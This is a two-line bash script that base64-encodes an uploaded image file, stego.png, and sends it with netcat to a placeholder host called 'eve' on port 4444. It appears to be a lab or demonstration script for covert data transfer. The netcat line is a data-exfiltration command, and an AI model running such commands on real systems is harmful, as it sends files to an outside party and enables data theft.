#!/bin/bash
/bin/base64 /srv/ftp/upload/stego.png | /bin/nc -q 1  IP eve 4444

